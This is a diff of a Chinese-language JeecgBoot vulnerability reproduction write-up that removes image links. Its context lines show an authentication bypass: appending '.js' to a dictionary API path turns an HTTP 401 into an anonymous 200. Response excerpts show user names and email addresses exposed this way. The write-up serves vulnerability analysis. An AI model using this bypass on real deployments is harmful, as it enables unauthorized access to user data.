@@ -163,7 +163,7 @@ private static String specialDictSqlXssStr =
 GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id      → HTTP 401（JWT拦截）
 ```
 
-![image.png](./.resource/JeecgBoot未授权权限绕过+SQL注入组合漏洞分析与复现/media/img-6497928a.png)
+
 
   
   
@@ -172,7 +172,7 @@ GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id      → HTTP 401（J
 GET /jeecg-boot/sys/dict/getDictItems/sys_user,realname,id.js   → HTTP 200（匿名放行）
 ```
 
-![image.png](./.resource/JeecgBoot未授权权限绕过+SQL注入组合漏洞分析与复现/media/img-8b79e8a3.png)
+
 
   
   
@@ -198,7 +198,7 @@ X-Timestamp: <当前毫秒时间戳>
 {"code":0,"result":[{"text":"测试用户","value":"..."},{"text":"张三","value":"..."}, ...]}
 ```
 
-![image.png](./.resource/JeecgBoot未授权权限绕过+SQL注入组合漏洞分析与复现/media/img-277df1d6.png)
+
 
   
   
@@ -216,7 +216,7 @@ X-Timestamp: <当前毫秒时间戳>
 {"code":0,"result":[]}
 ```
 
-![image.png](./.resource/JeecgBoot未授权权限绕过+SQL注入组合漏洞分析与复现/media/img-8600e534.png)
+
 
   
   
@@ -240,12 +240,12 @@ X-Timestamp: <当前毫秒时间戳>
 {"code":0,"result":[{"text":"111@1.com","value":"..."},{"text":"418799587@qq.com","value":"..."},{"text":"jeecg@163.com","value":"..."}, ...]}
 ```
 
-![image.png](./.resource/JeecgBoot未授权权限绕过+SQL注入组合漏洞分析与复现/media/img-46f8104b.png)
+
 
   
   
 
-![image.png](./.resource/JeecgBoot未授权权限绕过+SQL注入组合漏洞分析与复现/media/img-6fad416b.png)
+
 
   
   
